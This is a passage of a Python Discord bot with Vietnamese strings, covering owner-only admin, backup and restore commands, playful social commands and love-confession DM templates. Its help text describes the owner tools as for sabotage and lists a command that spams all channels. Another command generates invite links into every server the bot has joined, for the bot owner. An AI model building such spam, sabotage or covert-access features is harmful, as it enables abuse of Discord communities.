        description=f"Tổng thành viên: **{guild.member_count}**",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name="listroles")
@is_bot_owner()
async def list_roles(ctx):
    roles = [role.name for role in ctx.guild.roles if role.name != "@everyone"]
    if not roles:
        await ctx.send("📭 Không có role nào.")
        return
    embed = discord.Embed(
        title=f"📋 DANH SÁCH ROLE ({len(roles)} role)",
        description="\n".join(roles[:30]),
        color=0x00CCFF
    )
    if len(roles) > 30:
        embed.set_footer(text=f"Hiển thị 30/{len(roles)} role.")
    await ctx.send(embed=embed)

@list_roles.error
async def list_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="listchannels")
@is_bot_owner()
async def list_channels(ctx):
    channels = [ch.mention for ch in ctx.guild.text_channels]
    if not channels:
        await ctx.send("📭 Không có kênh văn bản nào.")
        return
    embed = discord.Embed(
        title=f"📋 DANH SÁCH KÊNH ({len(channels)} kênh)",
        description="\n".join(channels[:30]),
        color=0x00CCFF
    )
    if len(channels) > 30:
        embed.set_footer(text=f"Hiển thị 30/{len(channels)} kênh.")
    await ctx.send(embed=embed)

@list_channels.error
async def list_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="showsv")
@is_bot_owner()
async def showsv(ctx):
    try:
        guilds = bot.guilds
        if not guilds:
            await ctx.send("🤖 Bot hiện chưa tham gia server nào.")
            return
        embed = discord.Embed(
            title=f"🌐 **DANH SÁCH MÁY CHỦ BOT ĐANG THAM GIA ({len(guilds)})** 🌐",
            color=0x00FFFF
        )
        for guild in guilds:
            try:
                owner = guild.owner or await guild.fetch_member(guild.owner_id)
                owner_str = f"{owner} (`{guild.owner_id}`)"
            except:
                owner_str = f"Không xác định (`{guild.owner_id}`)"
            invite_link = "Không thể tạo link"
            try:
                for c in guild.text_channels:
                    if c.permissions_for(guild.me).create_instant_invite:
                        invite = await c.create_invite(max_age=300, max_uses=1)
                        invite_link = invite.url
                        break
            except:
                pass
            guild_info = (
                f"👑 **Chủ sở hữu:** {owner_str}\n"
                f"👥 **Thành viên:** `{guild.member_count}`\n"
                f"🔗 **Link mời:** {invite_link}"
            )
            embed.add_field(name=f"🏰 {guild.name} (`{guild.id}`)", value=guild_info, inline=False)
        embed.set_footer(text=f"Yêu cầu bởi Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@showsv.error
async def showsv_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="admincmd")
@is_bot_owner()
async def admin_commands(ctx):
    embed = discord.Embed(
        title="👑 DANH SÁCH LỆNH QUẢN TRỊ ĐẦY ĐỦ",
        description="Tất cả lệnh dành cho Boss Bảo và Owners, phân loại theo danh mục:",
        color=0xFFD700
    )
    for cat_name, data in HELP_CATEGORIES.items():
        cmds = data.get("commands", {})
        if not cmds:
            continue
        cmd_list = [f"• `{cmd}` – {desc}" for cmd, desc in cmds.items()]
        value = "\n".join(cmd_list)
        if len(value) <= 1024:
            embed.add_field(name=cat_name, value=value, inline=False)
        else:
            parts = []
            current = ""
            for line in cmd_list:
                if len(current) + len(line) + 2 > 1024:
                    parts.append(current)
                    current = line
                else:
                    current += "\n" + line if current else line
            if current:
                parts.append(current)
            for i, part in enumerate(parts):
                field_name = f"{cat_name} (phần {i+1})" if len(parts) > 1 else cat_name
                embed.add_field(name=field_name, value=part[:1024], inline=False)
    embed.set_footer(text="Độc quyền phục vụ Boss Bảo 💖", icon_url=bot.user.display_avatar.url)
    await ctx.send(embed=embed)

@admin_commands.error
async def admin_commands_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH HỆ THỐNG BACKUP/RESTORE ====================
@bot.command(name="backup")
@is_bot_owner()
async def backup_server(ctx):
    await ctx.send("⏳ Đang backup server...")
    try:
        guild = ctx.guild
        backup_data = {
            "name": guild.name,
            "channels": [],
            "roles": []
        }
        for channel in guild.channels:
            backup_data["channels"].append({
                "name": channel.name,
                "type": str(channel.type),
                "position": channel.position
            })
        for role in guild.roles:
            if role.name != "@everyone":
                backup_data["roles"].append({
                    "name": role.name,
                    "color": str(role.color),
                    "permissions": role.permissions.value
                })
        filename = f"backup_{guild.id}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(backup_data, f, indent=2, ensure_ascii=False)
        embed = discord.Embed(
            title="✅ ĐÃ BACKUP SERVER",
            description=f"📌 **Server:** {guild.name}\n📂 Đã backup `{len(backup_data['channels'])}` kênh và `{len(backup_data['roles'])}` role",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống backup Boss Bảo 💖")
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@backup_server.error
async def backup_server_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="restore")
@is_bot_owner()
async def restore_server(ctx, file_name: str = None):
    try:
        if file_name is None:
            file_name = f"backup_{ctx.guild.id}.json"
        if not os.path.exists(file_name):
            await ctx.send(f"❌ Không tìm thấy file backup `{file_name}`. Hãy chạy `n! backup` trước.")
            return
        with open(file_name, "r", encoding="utf-8") as f:
            backup_data = json.load(f)
        embed = discord.Embed(
            title="⚠️ **XÁC NHẬN RESTORE SERVER** ⚠️",
            description=(
                f"Bạn sắp khôi phục server **{ctx.guild.name}** từ file `{file_name}`.\n"
                f"**Hành động này sẽ xóa TOÀN BỘ kênh và role hiện tại** (trừ @everyone).\n"
                f"Số kênh sẽ tạo: `{len(backup_data.get('channels', []))}`\n"
                f"Số role sẽ tạo: `{len(backup_data.get('roles', []))}`\n\n"
                "Bạn có chắc chắn không?"
            ),
            color=0xFF0000
        )
        embed.set_footer(text="Boss Bảo - Hệ thống khôi phục")
        view = RestoreConfirmView(ctx, backup_data, file_name)
        await ctx.send(embed=embed, view=view)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@restore_server.error
async def restore_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH LEVEL ====================
@bot.command(name="setlv")
@is_bot_owner()
async def set_level(ctx, level: int, member: discord.Member):
    try:
        if level < 1:
            await ctx.send("❌ Level tối thiểu phải từ 1 trở lên!")
            return
        uid = str(member.id)
        USER_LEVELS[uid] = {"exp": 0, "level": level}
        save_json(LEVEL_FILE, USER_LEVELS)
        await check_and_assign_level_roles(member, level)
        embed = discord.Embed(
            title="⭐ **CẬP NHẬT LEVEL THÀNH CÔNG** ⭐",
            description=f"👑 Boss Bảo đã đặt level của {member.mention} lên mức **Level {level}**!",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản lý độc quyền của Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")

@set_level.error
async def set_level_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `n! setlv <level> @user`")

@bot.command(name="lv")
async def check_user_level(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author
    uid = str(member.id)
    user_data = USER_LEVELS.get(uid, {"exp": 0, "level": 1})
    current_level = user_data["level"]
    current_exp = user_data["exp"]
    required_exp = get_required_exp(current_level)
    embed = discord.Embed(
        title=f"📊 **HỆ THỐNG LEVEL - {member.display_name}** 📊",
        description=f"👤 **Thành viên:** {member.mention}\n⭐ **Level hiện tại:** `{current_level}`\n✨ **EXP:** `{current_exp} / {required_exp}`",
        color=0x00FFFF
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="Hệ thống thăng cấp độc quyền phục vụ server 💖")
    await ctx.send(embed=embed)

@check_user_level.error
async def check_user_level_error(ctx, error):
    await ctx.send(f"❌ Cú pháp đúng: `n! lv` hoặc `n! lv @user`")

# ==================== DANH SÁCH GIF MỚI ====================
GIF_LOVE = [
    "https://i.pinimg.com/originals/75/84/17/75841749adcb1bf105c8d75a602f5751.gif",
    "https://i.pinimg.com/originals/d4/9d/a9/d49da9f2d59c18322827e925f6880403.gif",
    "https://i.pinimg.com/originals/a8/96/5d/a8965dd2ec2662212f783c92248c7adf.gif",
    "https://i.pinimg.com/originals/60/bd/28/60bd28e041d83ed07ac88e00d30843d5.gif",
    "https://i.pinimg.com/originals/5c/a5/cf/5ca5cf3c67f294e666179989e4a5ba6b.gif",
]
GIF_HUG = [
    "https://i.pinimg.com/originals/16/f4/ef/16f4ef8659534c88264670265e2a1626.gif",
    "https://i.pinimg.com/originals/56/c7/3f/56c73f380d3ad747ff0600eb7ea1bbc7.gif",
    "https://i.pinimg.com/originals/0b/6b/d7/0b6bd7ba263b15094cae8450a68ff54b.gif",
    "https://i.pinimg.com/originals/46/0c/80/460c80d4423b0ba75ed9592b05599592.gif",
    "https://i.pinimg.com/originals/45/9c/c2/459cc283ee9bddcf14be26902c85cbd7.gif",
]
GIF_KISS = [
    "https://i.pinimg.com/originals/10/5a/7a/105a7ad7edbe74e5ca834348025cc650.gif",
    "https://i.pinimg.com/originals/a6/ab/46/a6ab46896615b80980ff4da911a1e167.gif",
    "https://i.pinimg.com/originals/ef/cc/cb/efcccb410c47e35559e71c8435505dbc.gif",
    "https://i.pinimg.com/originals/4a/38/9b/4a389bb65d9096a14992e74f83e6f55b.gif",
    "https://i.pinimg.com/originals/df/69/25/df692538bbf513f7bd94709435e96342.gif",
]
GIF_SLAP = [
    "https://i.pinimg.com/originals/2b/3a/3e/2b3a3e107ac57d4f170a8f8e414fec9f.gif",
    "https://i.pinimg.com/originals/7c/20/89/7c2089abf87dc52deb4179a6835088b6.gif",
    "https://i.pinimg.com/originals/12/2d/46/122d469b39b533d9490334d681d6c11a.gif",
    "https://i.pinimg.com/originals/ca/d7/62/cad7625a5c73d0c73bc67329174f9003.gif",
    "https://i.pinimg.com/originals/96/8c/b1/968cb1f9eaa12dde1d6fdf2f6ee296ed.gif",
]
GIF_PAT = [
    "https://i.pinimg.com/originals/e3/e2/58/e3e2588fbae9422f2bd4813c324b1298.gif",
    "https://i.pinimg.com/originals/95/86/e2/9586e24faa0664df1d01e3eab4a138f4.gif",
    "https://i.pinimg.com/originals/ce/22/9e/ce229e98f5cd4944a6315acf9cc8722c.gif",
    "https://i.pinimg.com/originals/b5/07/a4/b507a44553c871c0d7d69d8df5e414d6.gif",
    "https://i.pinimg.com/originals/37/73/55/3773555d02b0b946a30160e54d45589a.gif",
]
GIF_CUDDLE = [
    "https://i.pinimg.com/originals/a4/5e/ea/a45eea4151c014f6c48f20d7dd5167bb.gif",
    "https://i.pinimg.com/originals/87/63/46/8763461fd726e1cbfcd076d04c9513fe.gif",
    "https://i.pinimg.com/originals/8f/8b/a3/8f8ba3baeecdf28f3e0fa7d4ce1a8586.gif",
    "https://i.pinimg.com/originals/d2/53/83/d253835a6c993c65d2aa60ea848b6bb0.gif",
    "https://i.pinimg.com/originals/62/f5/aa/62f5aa2069259407435ee62b55962fbd.gif",
]
GIF_CRUSH = [
    "https://i.pinimg.com/originals/56/7a/66/567a666acdbccdf66f5afd02ee0fa997.gif",
    "https://i.pinimg.com/originals/fa/ae/32/faae32dc5b2099875d71b1eb62e27c60.gif",
    "https://i.pinimg.com/originals/7e/3b/e6/7e3be64966948331af33678199ce2089.gif",
    "https://i.pinimg.com/originals/e8/fd/6a/e8fd6a12c3422c6d25abe2742050cc4c.gif",
    "https://i.pinimg.com/originals/d5/33/52/d53352435cac71ab198b998146641752.gif",
]

# ==================== 100 CÂU TỎ TÌNH ====================
CRUSH_MESSAGES = [
    "{target_name} ơi, {author_name} muốn nói rằng trái tim này đã thuộc về bạn từ lâu rồi 💘",
    "Này {target_name}, {author_name} không biết từ khi nào lại thích bạn nhiều đến thế 🥰",
    "{target_name} à, {author_name} có một bí mật: tớ thích cậu rất nhiều ❤️",
    "Chào {target_name}, {author_name} chỉ muốn nói là bạn đẹp nhất trong mắt tớ 🌹",
    "{target_name} ơi, {author_name} crush bạn mất rồi, phải làm sao đây 😳",
    "Gửi {target_name}, {author_name} muốn bày tỏ rằng bạn là người đặc biệt nhất 💖",
    "{target_name} à, {author_name} thích bạn đến mức không thể giấu được nữa 😊",
    "Này {target_name}, {author_name} có thể mời bạn một ly cà phê không? ☕",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là ánh nắng trong ngày của tớ 🌞",
    "Gửi {target_name}, {author_name} không cần cả thế giới, chỉ cần có bạn là đủ 💑",
    "{target_name} à, {author_name} thích nụ cười của bạn, nó làm tớ tan chảy 😍",
    "Này {target_name}, {author_name} có thể nói là bạn rất dễ thương không? 🥺",
    "{target_name} ơi, {author_name} muốn nói rằng trái tim tớ đã có chủ rồi 💘",
    "Gửi {target_name}, {author_name} chỉ muốn bạn biết rằng bạn rất quan trọng với tớ ❤️",
    "{target_name} à, {author_name} thích bạn từ cái nhìn đầu tiên 👀",
    "Này {target_name}, {author_name} muốn nói rằng bạn là giấc mơ của tớ 🌙",
    "{target_name} ơi, {author_name} không thể ngừng nghĩ về bạn 💭",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là điều tuyệt vời nhất từng đến với tớ 💫",
    "{target_name} à, {author_name} thích bạn nhiều hơn cả sô cô la 🍫",
    "Này {target_name}, {author_name} muốn được nắm tay bạn đi khắp nơi 🤝",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là lý do tớ mỉm cười mỗi ngày 😊",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn rất đặc biệt không? 🥰",
    "{target_name} à, {author_name} thích bạn đến mức không thể tập trung làm gì khác 😅",
    "Này {target_name}, {author_name} muốn nói rằng bạn là ngôi sao sáng nhất trên bầu trời ⭐",
    "{target_name} ơi, {author_name} có cảm giác như đã quen bạn từ rất lâu rồi 💞",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là tất cả những gì tớ cần ❤️",
    "{target_name} à, {author_name} thích bạn, thích rất nhiều, thích đến điên dại 😘",
    "Này {target_name}, {author_name} có thể nói rằng bạn làm trái tim tớ loạn nhịp không? 💓",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là món quà tuyệt vời nhất 🎁",
    "Gửi {target_name}, {author_name} chỉ muốn bạn biết rằng tớ thích bạn 💌",
    "{target_name} à, {author_name} thích bạn như cách hoa hướng dương luôn hướng về mặt trời 🌻",
    "Này {target_name}, {author_name} muốn nói rằng bạn là định mệnh của tớ 💫",
    "{target_name} ơi, {author_name} có thể dành cả ngày chỉ để nhìn bạn cười 😊",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tuyệt vời nhất trên đời 💖",
    "{target_name} à, {author_name} thích bạn, không cần lý do gì cả ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là giấc mơ thành hiện thực của tớ 🌠",
    "{target_name} ơi, {author_name} muốn nói rằng trái tim tớ chỉ hướng về bạn 💘",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn rất dễ thương và tớ thích bạn không? 🥰",
    "{target_name} à, {author_name} thích bạn nhiều hơn cả những gì tớ có thể nói 💬",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ tìm kiếm bấy lâu nay 🔍",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là ánh sáng cuối đường hầm của tớ 🕯️",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là điều đẹp đẽ nhất trong cuộc sống của tớ 🌸",
    "{target_name} à, {author_name} thích bạn, thích cả những điều nhỏ nhặt nhất về bạn 😊",
    "Này {target_name}, {author_name} muốn nói rằng bạn là lý do tớ thức dậy mỗi sáng ☀️",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn dành cả đời để yêu 💑",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là niềm vui của tớ không? 🥰",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn rất lâu ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người đặc biệt nhất trong vũ trụ này 🌌",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ luôn nghĩ đến trước khi ngủ 😴",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là mảnh ghép còn thiếu của tớ 🧩",
    "{target_name} à, {author_name} thích bạn, thích đến mức không thể giấu được nữa 😊",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn chia sẻ mọi thứ cùng 👫",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn bảo vệ và yêu thương 💖",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn nắm tay đi đến cuối đời không? 💍",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ không bao giờ hối hận về điều đó ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn gặp mỗi ngày 😊",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn nói chuyện suốt đêm 🌙",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn dành tặng những điều tốt đẹp nhất 🎁",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào trái tim còn đập 💓",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn giữ chặt không bao giờ buông tay 🤝",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương bằng cả trái tim 💘",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn gọi là 'người yêu' không? 😳",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn không cần tớ nữa ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn ôm vào mỗi buổi sáng 🤗",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn nắm tay đi dạo dưới mưa ☔",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn cùng ngắm sao trên bầu trời ⭐",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn còn mỉm cười 😊",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn dành tặng nụ hôn đầu tiên 😘",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn nói lời yêu thương mỗi ngày 💌",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn che chở khỏi mọi bão giông 🌧️",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào trái đất ngừng quay 🌍",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn làm cho hạnh phúc mỗi ngày 😊",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương bằng cả trái tim và tâm hồn 💖",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn dành cả cuộc đời này để bên cạnh 💑",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn còn cần tớ ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn gọi mỗi khi mệt mỏi 📞",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn dựa vào mỗi khi yếu đuối 🤗",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn chia sẻ cả niềm vui và nỗi buồn không? 🥺",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn không còn cần tớ nữa ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn nắm tay đi hết cuộc đời này 👫",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương và trân trọng mỗi ngày 💎",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn dành tặng những điều ngọt ngào nhất 🍯",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào trái tim này còn đập vì bạn 💓",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn gọi là người yêu dấu của tớ 💑",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn ôm mỗi khi trời lạnh 🧣",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn gửi trao trọn vẹn con tim này không? 💘",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn không cần tớ nữa ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn cùng nhau già đi 👵👴",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương bằng cả sinh mệnh này 🌟",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn bảo vệ khỏi mọi nỗi buồn 🛡️",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn còn nhìn tớ bằng ánh mắt dịu dàng đó 😊",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn nắm tay đi khắp thế gian 🌍",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn gửi trao nụ cười hạnh phúc mỗi ngày 😊",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn yêu thương đến khi nào trái tim ngừng đập không? 💖",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn không cần tớ nữa ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn gọi là 'cả thế giới' của tớ 🌎",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn dành tặng trọn vẹn tình yêu này 💘",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương và chiều chuộng mỗi ngày 🥰",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn còn muốn tớ ở bên cạnh ❤️",
]

# ==================== LỆNH TÌNH YÊU ====================
@bot.command(name="love", aliases=["tinhyeu"])
async def love(ctx, user1: discord.Member = None, user2: discord.Member = None):
    if user1 is None:
        await ctx.send("📌 Cú pháp: `n! love @user1 @user2` hoặc `n! love @user`")
        return
    if user2 is None:
        user2 = ctx.author
        user1, user2 = user2, user1
    percent = random.randint(0, 100)
    if percent < 30:
        result = "💔 Có vẻ không hợp nhau lắm..."
    elif percent < 60:
        result = "😊 Cũng tạm được, có tiềm năng!"
    elif percent < 80:
        result = "❤️ Khá hợp nhau đấy!"
    else:
        result = "💖 Trời sinh một cặp!"
    embed = discord.Embed(
        title="💘 TỶ LỆ TÌNH YÊU",
        description=f"{user1.mention} và {user2.mention}\n\n**{percent}%** {result}",
        color=0xFF69B4
    )
    embed.set_thumbnail(url=user2.display_avatar.url)
    try:
        embed.set_image(url=random.choice(GIF_LOVE))
    except:
        pass
    await ctx.send(embed=embed)

@bot.command(name="hug", aliases=["om"])
async def hug(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! hug @user`")
        return
    embed = discord.Embed(
        title="🤗 ÔM",
        description=f"{ctx.author.mention} ôm {member.mention} thật chặt!",
        color=0xFFA500
    )
    try:
        embed.set_image(url=random.choice(GIF_HUG))
    except:
        pass
    await ctx.send(embed=embed)

@bot.command(name="kiss", aliases=["hon"])
async def kiss(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! kiss @user`")
        return
    embed = discord.Embed(
        title="😘 HÔN",
        description=f"{ctx.author.mention} hôn {member.mention} say đắm!",
        color=0xFF1493
    )
    try:
        embed.set_image(url=random.choice(GIF_KISS))
    except:
        pass
    await ctx.send(embed=embed)

@bot.command(name="slap", aliases=["tat"])
async def slap(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! slap @user`")
        return
    embed = discord.Embed(
        title="👋 TÁT",
        description=f"{ctx.author.mention} tát {member.mention} một phát!",
        color=0xFF0000
    )
    try:
        embed.set_image(url=random.choice(GIF_SLAP))
    except:
        pass
    await ctx.send(embed=embed)

@bot.command(name="pat", aliases=["vodau"])
async def pat(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! pat @user`")
        return
    embed = discord.Embed(
        title="🫳 VỖ ĐẦU",
        description=f"{ctx.author.mention} vỗ đầu {member.mention} nhẹ nhàng.",
        color=0xFFD700
    )
    try:
        embed.set_image(url=random.choice(GIF_PAT))
    except:
        pass
    await ctx.send(embed=embed)

@bot.command(name="cuddle", aliases=["auyem"])
async def cuddle(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! cuddle @user`")
        return
    embed = discord.Embed(
        title="🥰 ÂU YẾM",
        description=f"{ctx.author.mention} âu yếm {member.mention}.",
        color=0xFF69B4
    )
    try:
        embed.set_image(url=random.choice(GIF_CUDDLE))
    except:
        pass
    await ctx.send(embed=embed)

@bot.command(name="marry", aliases=["cuoi"])
async def marry(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! marry @user`")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự kết hôn với chính mình!")
        return
    guild_id = str(ctx.guild.id)
    if guild_id not in marriages:
        marriages[guild_id] = {}
    user1 = str(ctx.author.id)
    user2 = str(member.id)
    if user1 in marriages[guild_id] or user2 in marriages[guild_id]:
        await ctx.send("❌ Một trong hai người đã kết hôn rồi!")
        return
    marriages[guild_id][user1] = user2
    marriages[guild_id][user2] = user1
    save_json(MARRIAGE_FILE, marriages)
    embed = discord.Embed(
        title="💍 ĐÁM CƯỚI",
        description=f"Chúc mừng {ctx.author.mention} và {member.mention} đã trở thành vợ chồng!",
        color=0xFF69B4
    )
    try:
        embed.set_image(url=random.choice(GIF_LOVE))
    except:
        pass
    await ctx.send(embed=embed)

@bot.command(name="divorce", aliases=["lyhon"])
async def divorce(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! divorce @user`")
        return
    guild_id = str(ctx.guild.id)
    user1 = str(ctx.author.id)
    user2 = str(member.id)
    if guild_id in marriages and marriages[guild_id].get(user1) == user2:
        del marriages[guild_id][user1]
        del marriages[guild_id][user2]
        save_json(MARRIAGE_FILE, marriages)
        embed = discord.Embed(
            title="💔 LY HÔN",
            description=f"{ctx.author.mention} và {member.mention} đã chia tay.",
            color=0x0000FF
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send("❌ Hai bạn không phải là vợ chồng!")

@bot.command(name="ship", aliases=["ghepdoi"])
async def ship(ctx, user1: discord.Member = None, user2: discord.Member = None):
    if user1 is None:
        await ctx.send("📌 Cú pháp: `n! ship @user1 @user2`")
        return
    if user2 is None:
        user2 = ctx.author
    percent = random.randint(0, 100)
    if percent < 30:
        result = "💔 Chắc không thành đâu."
    elif percent < 60:
        result = "😊 Có duyên đấy."
    elif percent < 80:
        result = "❤️ Khá là hợp."
    else:
        result = "💖 Sinh ra để dành cho nhau."
    embed = discord.Embed(
        title="💘 GHÉP ĐÔI",
        description=f"{user1.mention} và {user2.mention}\n\n**{percent}%** {result}",
        color=0xFF1493
    )
    try:
        embed.set_image(url=random.choice(GIF_LOVE))
    except:
        pass
    await ctx.send(embed=embed)

@bot.command(name="crush", aliases=["totoinh"])
async def crush(ctx, member: discord.Member = None, *, message: str = None):
    if member is None:
        await ctx.send("📌 Cú pháp: `n! crush @user [nội dung]`")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự tỏ tình với chính mình!")
        return

    author = ctx.author
    target = member

    if message:
        dm_content = f"💌 **{target.display_name} ơi,**\n\n{author.display_name} muốn gửi đến bạn lời nhắn:\n\n{message}\n\n— {author.display_name}"
    else:
        sample_messages = random.sample(CRUSH_MESSAGES, 3)
        formatted_messages = [msg.format(author_name=author.display_name, target_name=target.display_name) for msg in sample_messages]
        dm_content = f"💌 **{target.display_name} ơi, {author.display_name} có điều muốn nói với bạn:**\n\n"
        dm_content += f"🌹 {formatted_messages[0]}\n\n"
        dm_content += f"💖 {formatted_messages[1]}\n\n"
        dm_content += f"💫 {formatted_messages[2]}\n\n"
        dm_content += f"# TỚ THÍCH CẬU, CẬU LÀM NGƯỜI YÊU TỚ ĐƯỢC KHÔNG? 💘"

    try:
        await target.send(dm_content)
        await ctx.send(f"✅ Đã gửi lời tỏ tình tới {target.mention} qua tin nhắn riêng!")
    except discord.Forbidden:
        await ctx.send(f"❌ Không thể gửi tin nhắn riêng cho {target.mention} (họ có thể đã chặn bot).")
    except Exception as e:
        await ctx.send(f"❌ Có lỗi xảy ra khi gửi tin nhắn: {e}")

# ==================== HELP CATEGORIES (cập nhật) ====================
HELP_CATEGORIES = {
    "👑 Lệnh Độc Quyền Owner": {
        "emoji": "👑",
        "description": "Bộ công cụ tối cao dành riêng cho Boss Bảo và Owners – quản trị server, phá hoại, kiểm soát tuyệt đối.",
        "commands": {
            "n! spam": "⚡ Bắt đầu spam tất cả các kênh",
            "n! stopspam": "🛑 Dừng hệ thống spam",
